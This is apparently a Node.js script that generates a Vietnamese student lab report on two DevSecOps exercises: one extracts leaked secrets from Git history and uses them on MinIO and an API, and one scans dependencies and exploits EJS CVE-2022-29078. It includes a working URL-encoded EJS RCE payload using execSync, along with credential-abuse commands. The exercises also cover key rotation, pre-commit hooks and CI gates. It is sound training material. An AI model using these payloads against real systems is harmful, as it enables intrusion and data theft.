// Bao cao tuan 2: Lab 3 (dso-secrets-git) + Lab 4 (dso-supplychain-sca)
const path = require('path');
const { render, makeC } = require('./engine');
const { C, h1, h2, h3, p, b, code, img, table } = makeC();

const VM = '192.168.17.144';
const NAM = 'Lê Thành Nam - B22DCAT202';
const EMAIL = 'namlt.b22at202@stu.ptit.edu.vn';
const MINH = 'Nguyễn Hồng Minh - B22DCAT190';
const EMAIL_MINH = 'minhnh.b22at190@stu.ptit.edu.vn';

h1('TỔNG QUAN NỘI DUNG TUẦN 2');
h2('Mục tiêu');
p('Trong tuần 2, nhóm thực hiện hai bài thực hành tiếp theo theo lộ trình kịch bản (từ cơ bản đến chuyên sâu) trên môi trường Labtainer, đóng vai trò sinh viên làm bài từ đầu đến cuối: khởi động bài lab, lần lượt chạy đúng từng dòng lệnh trong hướng dẫn, lấy flag và chấm điểm tự động bằng `checkwork`. Toàn bộ quá trình được chụp ảnh màn hình làm minh chứng.');
h2('Phân công thực hiện');
table(['STT', 'Bài thực hành', 'Mã lab', 'Người thực hiện'], [700, 3700, 2000, 3068], [
  ['3', 'Phát hiện secret trong lịch sử Git và khai thác', 'dso-secrets-git', NAM],
  ['4', 'Bảo mật chuỗi cung ứng phần mềm (SBOM & SCA)', 'dso-supplychain-sca', MINH],
]);
h2('Môi trường thực hiện');
b('Máy ảo Labtainer (VMware): Ubuntu, Docker; các bài lab chạy trong các container cô lập, offline khi làm bài.',
  `Truy cập giao diện đồ họa của máy ảo trực tiếp trên trình duyệt web qua noVNC (x11vnc chia sẻ màn hình :0, websockify phục vụ noVNC tại cổng 6080, \`http://${VM}:6080/vnc.html\`).`,
  'Mỗi sinh viên khởi động lab bằng email riêng; Labtainer dùng email này để sinh flag/khóa cá thể hóa (HASH_REPLACE), nên kết quả của mỗi người là khác nhau và không thể chép flag của nhau.');

// ---------------- LAB 3 ----------------
h1('BÀI THỰC HÀNH 3: PHÁT HIỆN SECRET TRONG LỊCH SỬ GIT (DSO-SECRETS-GIT)');
p('Người thực hiện: ' + NAM + ' (email khởi động lab: ' + EMAIL + ').');
h2('Mục đích');
b('Hiểu rằng xóa một file secret ở commit sau KHÔNG loại bỏ được secret: nội dung vẫn nằm trong lịch sử Git và lấy lại được (CWE-798, MITRE ATT&CK T1552).',
  'Dùng `git log`/`git show` và công cụ `gitleaks` (offline) để phát hiện và trích xuất secret bị lộ trong lịch sử repository.',
  'Chứng minh hậu quả: dùng credential lộ để truy cập object storage (MinIO) và API nội bộ lấy flag; sau đó khắc phục đúng quy trình DevSecOps: rotate secret, tách secret khỏi mã, và cài pre-commit hook chặn secret.');
h2('Môi trường bài lab');
b('Container `dev` (có terminal): chứa repository `~/repo` cần điều tra, cài sẵn `git`, `gitleaks`, `jq`, `mc` (MinIO client); kèm script `~/rotate_secrets.sh`.',
  'Container `storage` (không có terminal): dịch vụ object storage MinIO, chứa bucket `corp-backups` với flag; credential rò rỉ có quyền đọc bucket này.',
  'Container `app` (không có terminal): API nội bộ tại cổng 8080, trả flag khi nhận đúng Bearer token bị lộ.');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
p('Tại terminal Labtainer, chạy lệnh khởi động và nhập email sinh viên; Labtainer tạo 3 container và mở terminal của container `dev`.');
code('labtainer -r dso-secrets-git');
img('l3_01_start.png', 'Khởi động bài lab dso-secrets-git và mở terminal container dev');
h3('Nhiệm vụ 1 - Trinh sát lịch sử Git');
p('Liệt kê toàn bộ commit (kể cả các nhánh), và truy vết các commit thêm/xóa file cấu hình nhạy cảm bằng tìm kiếm theo nội dung:');
code("cd ~/repo\ngit log --oneline --all\ngit log -S 'AKIA' --oneline --all\ngit log -S 'password' --oneline --all");
img('l3_02_gitlog.png', 'Lịch sử commit: commit aed7698 thêm deploy/credentials.yaml, commit 5c74809 xóa file');
p('Xác định đúng một commit thêm (`aed7698`) và một commit xóa (`5c74809`) file `deploy/credentials.yaml`, ghi vào `~/recon_answers.txt`. HEAD hiện tại không còn file này nhưng nội dung vẫn nằm trong lịch sử.');
h3('Nhiệm vụ 2 - Quét secret bằng gitleaks (offline)');
code("gitleaks detect --source ~/repo -v --report-path ~/gitleaks.json\njq -r '.[] | \"\\(.RuleID)\\t\\(.Commit)\\t\\(.File)\\t\\(.Secret)\"' ~/gitleaks.json");
img('l3_03_gitleaks.png', 'gitleaks quét 6 commit, phát hiện 2 secret (access key, secret key) trong credentials.yaml');
p('Trích đủ 4 secret (AWS access key, secret key, DB password, API token) từ `git show aed7698:deploy/credentials.yaml` và lưu vào `~/secrets_found.txt`.');
h3('Nhiệm vụ 3 - Khai thác: dùng secret lộ lấy flag');
p('Dùng cặp khóa lộ cấu hình `mc` để đọc bucket riêng trên MinIO, và dùng API token lộ để gọi API nội bộ:');
code('mc alias set leak http://storage:9000 <ACCESS_KEY> <SECRET_KEY>\nmc cat leak/corp-backups/flags/flag.txt | tee ~/loot_storage.txt\ncurl -s -H "Authorization: Bearer <API_TOKEN>" http://app:8080/flag | jq -r \'.flag\' | tee ~/loot_api.txt');
img('l3_04_exploit.png', 'Dùng khóa lộ đọc flag storage 9196d3bf1fca04c42eeb và flag API 99dd917cc01739de0884');
h3('Nhiệm vụ 4 - Khắc phục và ngăn ngừa tái diễn');
p('Chạy script rotate secret (vô hiệu khóa cũ), tự kiểm chứng khóa cũ bị từ chối, thêm `.gitignore`, và cài pre-commit hook quét secret bằng gitleaks (shift-left):');
code("~/rotate_secrets.sh\nmc ls leak   # ky vong: Access Denied (khoa cu da bi vo hieu)\nprintf '%s\\n' '.env' '*.env' 'deploy/credentials.yaml' >> ~/repo/.gitignore");
code("cat > ~/repo/.git/hooks/pre-commit <<'HOOK'\n#!/bin/sh\ngitleaks protect --staged -v || { echo BLOCKED; exit 1; }\nHOOK\nchmod +x ~/repo/.git/hooks/pre-commit");
img('l3_05_harden.png', 'Rotate khóa (khóa cũ bị DENIED), pre-commit hook chặn commit chứa secret (COMMIT_BLOCKED)');
h2('Kết quả thực hiện');
p('Chạy `checkwork dso-secrets-git` để chấm điểm tự động:');
img('l3_06_checkwork.png', 'Kết quả chấm điểm tự động bài dso-secrets-git: 16/16 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3400, 4600, 900], [
  ['g_recon_history', 'Trinh sát lịch sử Git tìm secret', 'Y'],
  ['g_scan_secrets', 'Quét và trích xuất secret', 'Y'],
  ['g_flag_storage', 'Lấy flag từ MinIO storage', 'Y'],
  ['g_flag_api', 'Lấy flag từ API nội bộ', 'Y'],
  ['g_exploit_get_flag', 'Khai thác secret lấy flag', 'Y'],
  ['g_rotate_proof', 'Rotate secret đã lộ', 'Y'],
  ['g_harden_rotate', 'Kiểm chứng khóa cũ bị vô hiệu', 'Y'],
  ['g_harden_shiftleft', 'Cài pre-commit hook (shift-left)', 'Y'],
  ['g_remediation_harden', 'Hoàn tất khắc phục', 'Y'],
  ['r_recon_ok / r_gitleaks_ok', 'Đáp án trinh sát & gitleaks đúng', 'Y'],
  ['r_creds_ok / r_oldkey_denied', 'Trích đúng secret; khóa cũ bị chặn', 'Y'],
  ['r_gitignore_env / r_hook_ok / r_hook_blocked', '.gitignore, hook cài & chặn đúng', 'Y'],
]);
p('Kết quả: hoàn thành 16/16 mục tiêu; flag storage `9196d3bf1fca04c42eeb`, flag API `99dd917cc01739de0884`.');

// ---------------- LAB 4 ----------------
h1('BÀI THỰC HÀNH 4: BẢO MẬT CHUỖI CUNG ỨNG PHẦN MỀM (DSO-SUPPLYCHAIN-SCA)');
p('Người thực hiện: ' + MINH + ' (email khởi động lab: ' + EMAIL_MINH + ').');
h2('Mục đích');
b('Sinh SBOM (Software Bill of Materials) theo chuẩn CycloneDX bằng `syft` để lập danh mục thành phần phần mềm.',
  'Quét lỗ hổng phụ thuộc (SCA) bằng `trivy` ở chế độ offline, xác định CVE nghiêm trọng cần ưu tiên xử lý.',
  'Chứng minh hậu quả: khai thác CVE-2022-29078 (EJS RCE) trên ứng dụng đang chạy để lấy flag; sau đó khắc phục (nâng phiên bản thư viện) và dựng security gate SCA cho CI (A06:2021, MITRE T1195).');
h2('Môi trường bài lab');
b('Container `dev` (có terminal): chứa mã nguồn `~/vuln-notes` (ứng dụng Node.js dùng thư viện cũ), cài sẵn `syft`, `trivy` (có CSDL offline), `npm` (cache offline), `jq`.',
  'Container `appserver` (không có terminal): chạy ứng dụng vuln-notes tại cổng 3000, endpoint `/notes?name=` render template bằng EJS 3.1.6 nên dính CVE-2022-29078.',
  'Toàn bộ quá trình quét và cài đặt chạy offline (không cần Internet).');
h2('Nội dung thực hành');
h3('Khởi động bài lab');
code('labtainer -r dso-supplychain-sca');
img('l4_01_start.png', 'Khởi động bài lab dso-supplychain-sca và mở terminal container dev');
h3('Nhiệm vụ 1 - Sinh SBOM (CycloneDX)');
code("cd ~/vuln-notes\nsyft dir:. -o cyclonedx-json=sbom.cdx.json\ngrep -o '\"purl\"' sbom.cdx.json | wc -l");
img('l4_02_sbom.png', 'Sinh SBOM CycloneDX bằng syft: lập danh mục 75 thành phần (purl)');
h3('Nhiệm vụ 2 - Quét SCA bằng Trivy (offline)');
code('trivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o trivy-report.json .');
img('l4_03_trivy.png', 'Trivy quét offline phát hiện CRITICAL ejs@3.1.6 CVE-2022-29078 (RCE)');
h3('Nhiệm vụ 3 - Khai thác phụ thuộc có lỗ hổng (EJS RCE)');
p('Endpoint `/notes?name=` đưa tham số người dùng vào options của EJS; chèn mã qua option `outputFunctionName` để thực thi lệnh sao chép flag ra thư mục tĩnh rồi tải về:');
code("Q='settings%5Bview%20options%5D%5BoutputFunctionName%5D=x%3Bprocess.mainModule.require(%27child_process%27).execSync(%27cp%20%2Fflag.txt%20%2Fhome%2Fubuntu%2Fapp%2Fpublic%2Fleak.txt%27)%3Bs'\ncurl -s \"http://appserver:3000/notes?name=x&$Q\" >/dev/null\ncurl -s http://appserver:3000/leak.txt | tee ~/flag_loot.txt");
img('l4_04_exploit.png', 'Khai thác EJS RCE (CVE-2022-29078) lấy flag 9f4f0339e67c111bc709');
h3('Nhiệm vụ 4 - Khắc phục và dựng security gate');
p('Nâng `ejs` lên bản vá (offline từ cache npm), quét lại, lập `.trivyignore` có kiểm soát cho các CVE gián tiếp còn lại, rồi dựng cổng chặn CI:');
code('npm install ejs@3.1.10\ntrivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL -f json -o after.json .\ngrep -oE \'CVE-[0-9]{4}-[0-9]+\' after.json | grep -v \'CVE-2022-29078\' | sort -u > .trivyignore');
code("cat > scan-gate.sh <<'EOS'\n#!/bin/bash\nset -e\ntrivy fs --scanners vuln --offline-scan --skip-db-update --severity HIGH,CRITICAL --exit-code 1 --ignorefile .trivyignore .\necho \"SCA gate PASSED\"\nEOS\nchmod +x scan-gate.sh\n./scan-gate.sh | tee ~/gate_result.txt");
img('l4_05_gate.png', 'Nâng ejs@3.1.10 (offline), quét lại sạch, security gate in "SCA gate PASSED"');
h2('Kết quả thực hiện');
p('Chạy `checkwork dso-supplychain-sca` để chấm điểm tự động:');
img('l4_06_checkwork.png', 'Kết quả chấm điểm tự động bài dso-supplychain-sca: 5/5 mục tiêu đạt (Y)');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3000, 5000, 900], [
  ['generate_sbom', 'Sinh SBOM CycloneDX bằng syft', 'Y'],
  ['scan_dependencies', 'Quét SCA offline, xác định CVE', 'Y'],
  ['exploit_dependency', 'Khai thác EJS RCE lấy flag', 'Y'],
  ['remediate_and_gate', 'Nâng phiên bản & dựng CI gate', 'Y'],
]);
p('Kết quả: hoàn thành 4/4 mục tiêu; SBOM 75 thành phần; flag `9f4f0339e67c111bc709`; toàn bộ chạy offline.');

// ---------------- KET LUAN ----------------
h1('KẾT LUẬN');
h2('Kết quả đạt được');
b('Hoàn thành bài 3 (dso-secrets-git): checkwork 16/16 mục tiêu đạt; trích xuất secret từ lịch sử Git, khai thác lấy 2 flag, rotate khóa và cài pre-commit hook chặn secret.',
  'Hoàn thành bài 4 (dso-supplychain-sca): checkwork 4/4 mục tiêu đạt; sinh SBOM, quét SCA offline, khai thác EJS RCE, nâng phiên bản và dựng security gate — toàn bộ chạy offline.',
  'Cả hai bài đều được thực hiện bằng cách sao chép đúng từng dòng lệnh trong hướng dẫn, xác nhận hướng dẫn chạy đúng và bài lab thực sự làm được.');

render(C, {
  imgDir: path.join(__dirname, 'anh2'),
  out: path.join(__dirname, '..', 'bao-cao-tuan-2', 'Bao-cao-tuan-2.docx'),
}).catch(e => { console.error(e); process.exit(1); });
